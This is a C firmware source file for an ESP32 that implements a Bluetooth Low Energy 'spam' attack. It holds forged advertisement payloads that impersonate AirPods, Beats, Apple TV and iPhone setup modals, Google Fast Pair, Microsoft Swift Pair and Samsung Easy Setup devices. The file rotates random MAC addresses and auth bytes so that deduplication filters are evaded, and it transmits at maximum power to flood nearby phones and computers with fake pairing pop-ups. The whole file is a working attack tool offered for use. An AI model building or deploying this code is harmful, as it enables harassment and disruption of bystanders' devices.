#include "bt_spam.h"
#include <string.h>
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_err.h"
#include "esp_gap_ble_api.h"
#include "esp_log.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"

static const char* TAG = "bt_spam";

static bt_spam_cb_display display_records_cb = NULL;
static volatile bool running_task = false;
static volatile bool is_advertising_active = false;
static int adv_index = 0;
static TaskHandle_t adv_task_handle = NULL;
static SemaphoreHandle_t adv_sem = NULL;
static volatile esp_gap_ble_cb_event_t expected_event = 0;
static volatile esp_bt_status_t last_event_status = ESP_BT_STATUS_SUCCESS;
static bt_spam_mode_t current_mode = BT_SPAM_MODE_ALL;

/*
 * ADV_TYPE_IND (connectable undirected advertising) allows adv_int down to 20ms (0x20)
 * and is required for Apple proximity/continuity modals, Android Fast Pair, and Windows Swift Pair.
 */
static esp_ble_adv_params_t ble_adv_params = {
    .adv_int_min = 0x20,  /* 20ms */
    .adv_int_max = 0x30,  /* 30ms */
    .adv_type = ADV_TYPE_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

typedef enum {
  SPAM_TYPE_APPLE_PROXIMITY,
  SPAM_TYPE_APPLE_ACTION,
  SPAM_TYPE_GOOGLE_FAST_PAIR,
  SPAM_TYPE_MICROSOFT_SWIFT,
  SPAM_TYPE_SAMSUNG_SETUP,
} spam_packet_type_t;

typedef struct {
  const char* name;
  spam_packet_type_t type;
  uint8_t len;
  uint8_t data[31];
} spam_model_t;

static const spam_model_t spam_models[] = {
    /* =========================================================================
     * 1. APPLE PROXIMITY PAIRING (AirPods, Beats) - Type 0x07
     * ========================================================================= */
    {
        .name = "Apple AirPods 1",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75,
                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple AirPods 2",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75,
                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple AirPods 3",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75,
                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple AirPods Pro",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75,
                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple AirPods Pro 2",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75,
                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple AirPods Max",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75,
                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Powerbeats",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75,
                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Powerbeats Pro",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75,
                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Solo Pro",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75,
                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Studio Buds",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75,
                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Flex",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75,
                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Studio Pro",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75,
                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Fit Pro",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75,
                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Studio Buds+",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75,
                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },

    /* =========================================================================
     * 2. APPLE CONTINUITY / NEARBY ACTION MODALS - Type 0x10
     * ========================================================================= */
    {
        .name = "AppleTV Setup",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x20, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Transfer Number",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x27, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "AirDrop Modal",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x09, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "HomePod Setup",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x0d, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "AppleTV Keyboard",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x05, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple Watch Setup",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x01, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Setup New Phone",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x2b, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "AppleTV Audio",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x13, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },

    /* =========================================================================
     * 3. GOOGLE FAST PAIR (Android) - Service UUID 0xFE2C + TxPower Level (-21 dBm)
     * ========================================================================= */
    {
        .name = "Google Pixel Buds",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xdf, 0x28, 0x03, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Pixel Buds Pro",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0x71, 0x8f, 0xa4, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Pixel Buds A-Series",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xa6, 0xb7, 0x96, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Samsung Galaxy Buds FP",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xee, 0x49, 0x23, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Sony WH-1000XM4",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0x01, 0x82, 0x1e, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Sony WF-1000XM4",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0x27, 0x18, 0x00, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "JBL Flip 6",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xaa, 0x22, 0x11, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Bose QC35 II",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xf6, 0xc4, 0x20, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "JBL Live 300",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0x0a, 0x00, 0x02, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "OnePlus Buds",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xdf, 0xa9, 0xc4, 0x02, 0x0a, 0xeb},
    },

    /* =========================================================================
     * 4. MICROSOFT SWIFT PAIR (Windows 10 / 11) - Appearance (0x19) + Beacon (0x03) + Name (0x09)
     * ========================================================================= */
    {
        .name = "MS Surface Mouse",
        .type = SPAM_TYPE_MICROSOFT_SWIFT,
        .len = 29,
        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0xc2, 0x03, 0x06, 0xff, 0x06,
                 0x00, 0x03, 0x00, 0x80, 0x0e, 0x09, 'S', 'u', 'r', 'f',
                 'a', 'c', 'e', ' ', 'M', 'o', 'u', 's', 'e'},
    },
    {
        .name = "MS Surface Keyboard",
        .type = SPAM_TYPE_MICROSOFT_SWIFT,
        .len = 27,
        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0xc1, 0x03, 0x06, 0xff, 0x06,
                 0x00, 0x03, 0x00, 0x80, 0x0c, 0x09, 'S', 'u', 'r', 'f',
                 'a', 'c', 'e', ' ', 'K', 'b', 'd'},
    },
    {
        .name = "MS Surface Audio",
        .type = SPAM_TYPE_MICROSOFT_SWIFT,
        .len = 29,
        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0x42, 0x08, 0x06, 0xff, 0x06,
                 0x00, 0x03, 0x00, 0x80, 0x0e, 0x09, 'S', 'u', 'r', 'f',
                 'a', 'c', 'e', ' ', 'A', 'u', 'd', 'i', 'o'},
    },
    {
        .name = "Xbox Controller",
        .type = SPAM_TYPE_MICROSOFT_SWIFT,
        .len = 31,
        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0xc4, 0x03, 0x06, 0xff, 0x06,
                 0x00, 0x03, 0x00, 0x80, 0x10, 0x09, 'X', 'b', 'o', 'x',
                 ' ', 'C', 'o', 'n', 't', 'r', 'o', 'l', 'l', 'e', 'r'},
    },

    /* =========================================================================
     * 5. SAMSUNG EASY SETUP / QUICK PAIRING - Company ID 0x0075 (100% Battery & Lid Open)
     * ========================================================================= */
    {
        .name = "Galaxy Buds Live",
        .type = SPAM_TYPE_SAMSUNG_SETUP,
        .len = 27,
        .data = {0x1a, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x01, 0x01, 0x00,
                 0x00, 0x00, 0x64, 0x64, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Galaxy Buds Pro",
        .type = SPAM_TYPE_SAMSUNG_SETUP,
        .len = 27,
        .data = {0x1a, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x02, 0x01, 0x00,
                 0x00, 0x00, 0x64, 0x64, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Galaxy Buds2 Pro",
        .type = SPAM_TYPE_SAMSUNG_SETUP,
        .len = 27,
        .data = {0x1a, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x03, 0x01, 0x00,
                 0x00, 0x00, 0x64, 0x64, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Galaxy Watch Setup",
        .type = SPAM_TYPE_SAMSUNG_SETUP,
        .len = 27,
        .data = {0x1a, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x04, 0x01, 0x00,
                 0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
};

#define TOTAL_SPAM_MODELS (sizeof(spam_models) / sizeof(spam_models[0]))

static uint8_t active_indices[TOTAL_SPAM_MODELS];
static uint8_t active_indices_count = 0;

static bool model_matches_mode(const spam_model_t* model, bt_spam_mode_t mode) {
  switch (mode) {
    case BT_SPAM_MODE_APPLE:
      return (model->type == SPAM_TYPE_APPLE_PROXIMITY ||
              model->type == SPAM_TYPE_APPLE_ACTION);
    case BT_SPAM_MODE_ANDROID:
      return (model->type == SPAM_TYPE_GOOGLE_FAST_PAIR);
    case BT_SPAM_MODE_WINDOWS:
      return (model->type == SPAM_TYPE_MICROSOFT_SWIFT);
    case BT_SPAM_MODE_SAMSUNG:
      return (model->type == SPAM_TYPE_SAMSUNG_SETUP);
    case BT_SPAM_MODE_ALL:
    default:
      return true;
  }
}

static void rebuild_active_indices(bt_spam_mode_t mode) {
  active_indices_count = 0;
  for (uint8_t i = 0; i < TOTAL_SPAM_MODELS; i++) {
    if (model_matches_mode(&spam_models[i], mode)) {
      active_indices[active_indices_count++] = i;
    }
  }
  if (active_indices_count == 0) {
    for (uint8_t i = 0; i < TOTAL_SPAM_MODELS; i++) {
      active_indices[i] = i;
    }
    active_indices_count = TOTAL_SPAM_MODELS;
  }
}

static void generate_random_mac(esp_bd_addr_t rand_addr) {
  esp_fill_random(rand_addr, ESP_BD_ADDR_LEN);
  /* Static random address: two MSBs must be 1 per BLE Core Spec (0xC0) */
  rand_addr[0] |= 0xC0;
}

static uint8_t prepare_payload(int index, uint8_t* out_buffer) {
  const spam_model_t* model = &spam_models[index];
  uint8_t len = model->len;
  memcpy(out_buffer, model->data, len);

  /* Dynamic randomization of ephemeral fields to bypass deduplication filters */
  switch (model->type) {
    case SPAM_TYPE_APPLE_PROXIMITY:
      /* Randomize Lid counter / sequence (byte 11) and Auth tag (bytes 15-18) */
      out_buffer[11] = (uint8_t)(esp_random() & 0xFF);
      out_buffer[15] = (uint8_t)(esp_random() & 0xFF);
      out_buffer[16] = (uint8_t)(esp_random() & 0xFF);
      out_buffer[17] = (uint8_t)(esp_random() & 0xFF);
      out_buffer[18] = (uint8_t)(esp_random() & 0xFF);
      break;

    case SPAM_TYPE_APPLE_ACTION:
      /* Randomize auth bytes (bytes 9-14) */
      out_buffer[9] = (uint8_t)(esp_random() & 0xFF);
      out_buffer[10] = (uint8_t)(esp_random() & 0xFF);
      out_buffer[11] = (uint8_t)(esp_random() & 0xFF);
      out_buffer[12] = (uint8_t)(esp_random() & 0xFF);
      out_buffer[13] = (uint8_t)(esp_random() & 0xFF);
      out_buffer[14] = (uint8_t)(esp_random() & 0xFF);
      break;

    case SPAM_TYPE_MICROSOFT_SWIFT:
      /* In Swift Pair with Appearance: byte 13 is reserved RSSI byte, byte 12 is subscenario */
      break;

    case SPAM_TYPE_SAMSUNG_SETUP:
      /* Randomize session salt / nonce (bytes 9-11) while maintaining 100% battery & lid open */
      out_buffer[9] = (uint8_t)(esp_random() & 0xFF);
      out_buffer[10] = (uint8_t)(esp_random() & 0xFF);
      out_buffer[11] = (uint8_t)(esp_random() & 0xFF);
      break;

    case SPAM_TYPE_GOOGLE_FAST_PAIR:
    default:
      break;
  }

  return len;
}

/*
 * GAP callback. All BLE operations are asynchronous in Bluedroid.
 * The semaphore adv_sem synchronizes the control task with GAP completion events.
 */
static void esp_gap_cb(esp_gap_ble_cb_event_t event,
                       esp_ble_gap_cb_param_t* param) {
  switch (event) {
    case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
      last_event_status = param->adv_data_raw_cmpl.status;
      if (expected_event == ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT && adv_sem != NULL) {
        xSemaphoreGive(adv_sem);
      }
      break;

    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
      last_event_status = param->adv_start_cmpl.status;
      if (last_event_status == ESP_BT_STATUS_SUCCESS) {
        is_advertising_active = true;
      }
      if (expected_event == ESP_GAP_BLE_ADV_START_COMPLETE_EVT && adv_sem != NULL) {
        xSemaphoreGive(adv_sem);
      }
      break;

    case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
      last_event_status = param->adv_stop_cmpl.status;
      is_advertising_active = false;
      if (expected_event == ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT && adv_sem != NULL) {
        xSemaphoreGive(adv_sem);
      }
      break;

    case ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT:
      last_event_status = param->set_rand_addr_cmpl.status;
      if (expected_event == ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT && adv_sem != NULL) {
        xSemaphoreGive(adv_sem);
      }
      break;

    case ESP_GAP_BLE_UPDATE_CONN_PARAMS_EVT:
      break;

    default:
      break;
  }
}

/*
 * Robust zero-latency GAP helper: drains stale semaphores and sets expected_event
 * BEFORE dispatching the asynchronous API call.
 */
static bool execute_gap_step(esp_err_t err, esp_gap_ble_cb_event_t evt, TickType_t timeout) {
  if (err != ESP_OK || adv_sem == NULL) {
    expected_event = 0;
    return false;
  }
  if (xSemaphoreTake(adv_sem, timeout) == pdTRUE) {
    return (last_event_status == ESP_BT_STATUS_SUCCESS);
  }
  expected_event = 0;
  return false;
}

/*
 * Background task: drives the advertising dwell timer and payload cycling.
 * Synchronized with Bluedroid GAP events via adv_sem.
 */
static void start_adv(void* pvParameters) {
  uint8_t payload_buffer[31];

  while (running_task) {
    if (active_indices_count == 0) {
      vTaskDelay(pdMS_TO_TICKS(50));
      continue;
    }

    uint8_t model_idx = active_indices[adv_index];

    /* 1. Stop advertising if active before updating MAC/Payload */
    if (is_advertising_active) {
      xSemaphoreTake(adv_sem, 0);
      expected_event = ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT;
      esp_err_t ret = esp_ble_gap_stop_advertising();
      execute_gap_step(ret, ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT, pdMS_TO_TICKS(50));
      is_advertising_active = false;
    }

    if (!running_task) {
      break;
    }

    /* 2. Set fresh static random MAC address */
    esp_bd_addr_t rand_addr;
    generate_random_mac(rand_addr);
    xSemaphoreTake(adv_sem, 0);
    expected_event = ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT;
    esp_err_t ret = esp_ble_gap_set_rand_addr(rand_addr);
    execute_gap_step(ret, ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT, pdMS_TO_TICKS(50));

    if (!running_task) {
      break;
    }

    /* 3. Prepare payload with dynamic randomized ephemeral fields */
    uint8_t payload_len = prepare_payload(model_idx, payload_buffer);

    /* 4. Configure advertising payload */
    xSemaphoreTake(adv_sem, 0);
    expected_event = ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT;
    ret = esp_ble_gap_config_adv_data_raw(payload_buffer, payload_len);
    execute_gap_step(ret, ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT, pdMS_TO_TICKS(50));

    if (!running_task) {
      break;
    }

    /* 5. Update display safely before transmission */
    if (display_records_cb != NULL && running_task) {
      display_records_cb(spam_models[model_idx].name);
    }

    /* 6. Start advertising */
    xSemaphoreTake(adv_sem, 0);
    expected_event = ESP_GAP_BLE_ADV_START_COMPLETE_EVT;
    ret = esp_ble_gap_start_advertising(&ble_adv_params);
    execute_gap_step(ret, ESP_GAP_BLE_ADV_START_COMPLETE_EVT, pdMS_TO_TICKS(50));

    /* 7. Dwell for ~250ms in 50ms slices for fast exit response */
    for (int i = 0; i < 5 && running_task; i++) {
      vTaskDelay(pdMS_TO_TICKS(50));
    }

    /* 8. Advance to next model within current active mode */
    adv_index = (adv_index + 1) % active_indices_count;
  }

  /* Cleanup on task exit */
  if (is_advertising_active) {
    esp_ble_gap_stop_advertising();
    is_advertising_active = false;
  }

  adv_task_handle = NULL;
  vTaskDelete(NULL);
}

void bt_spam_register_cb(bt_spam_cb_display callback) {
  display_records_cb = callback;
}

bool bt_spam_is_running(void) {
  return running_task;
}

void bt_spam_app_main(bt_spam_mode_t mode) {
#if !defined(CONFIG_BT_SPAM_APP_DEBUG)
  esp_log_level_set(TAG, ESP_LOG_NONE);
#endif

  if (esp_bt_controller_get_status() == ESP_BT_CONTROLLER_STATUS_IDLE) {
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_err_t ret = esp_bt_controller_init(&bt_cfg);
    if (ret != ESP_OK) {
      ESP_LOGE(TAG, "bt_controller_init failed: %s", esp_err_to_name(ret));
      return;
    }
    ret = esp_bt_controller_enable(ESP_BT_MODE_BLE);
    if (ret != ESP_OK) {
      ESP_LOGE(TAG, "bt_controller_enable failed: %s", esp_err_to_name(ret));
      return;
    }
  }

  if (esp_bluedroid_get_status() == ESP_BLUEDROID_STATUS_UNINITIALIZED) {
    esp_err_t ret = esp_bluedroid_init();
    if (ret != ESP_OK) {
      ESP_LOGE(TAG, "bluedroid_init failed: %s", esp_err_to_name(ret));
      return;
    }
    ret = esp_bluedroid_enable();
    if (ret != ESP_OK) {
      ESP_LOGE(TAG, "bluedroid_enable failed: %s", esp_err_to_name(ret));
      return;
    }
  }

  /* Set maximum RF TX power on ESP32-C6 for maximum range and RSSI bypass */
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P20);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P20);

  if (adv_sem == NULL) {
    adv_sem = xSemaphoreCreateBinary();
  }

  esp_err_t ret = esp_ble_gap_register_callback(esp_gap_cb);
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "gap_register_callback failed: %s", esp_err_to_name(ret));
    return;
  }

  current_mode = mode;
  rebuild_active_indices(current_mode);
  adv_index = 0;
  is_advertising_active = false;
  running_task = true;
  xTaskCreate(&start_adv, "bt_spam_adv", 4096, NULL, 5, &adv_task_handle);
}

void bt_spam_app_stop(void) {
  running_task = false;
  display_records_cb = NULL;

  /* Unblock waiting task */
  if (adv_sem != NULL) {
    xSemaphoreGive(adv_sem);
  }

  /* Wait for task to exit cleanly */
  if (adv_task_handle != NULL) {
    uint8_t retries = 50;  /* 50 x 10ms = 500ms max wait */
    while (adv_task_handle != NULL && retries-- > 0) {
      vTaskDelay(pdMS_TO_TICKS(10));
    }
    if (adv_task_handle != NULL) {
      vTaskDelete(adv_task_handle);
      adv_task_handle = NULL;
    }
  }

  /* Guarantee advertising is stopped at the controller level */
  esp_ble_gap_stop_advertising();
  is_advertising_active = false;

  /* Clean up semaphore */
  if (adv_sem != NULL) {
    vSemaphoreDelete(adv_sem);
    adv_sem = NULL;
  }
}


